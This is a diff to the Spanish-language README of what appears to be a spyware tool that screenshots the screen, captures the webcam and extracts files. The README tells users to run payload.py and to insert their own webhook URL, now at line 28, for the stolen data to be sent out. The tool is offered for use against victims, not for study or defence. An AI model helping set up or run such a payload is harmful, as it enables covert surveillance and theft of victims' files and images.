@@ -39,7 +39,7 @@ Una herramienta que saca captura a la pantalla, captura la webcam, Extrae archiv
 > - Ejecuta : *Windows:* `python payload.py` *Linux:* `python3 payload.py`
 
 > [!CAUTION]
-> En la linea `19` en `PONE LA URL A TU WEBHOOK` es obligatorio tener la url de tu webhook si esta url no esta el payload no funcionara
+> En la linea `28` en `url del webhook aca | creado por t.me/Valen_Qq` es obligatorio tener la url de tu webhook si esta url no esta el payload no funcionara
 
 > [!TIP]
 > - Crear WEBHOOK tutorial
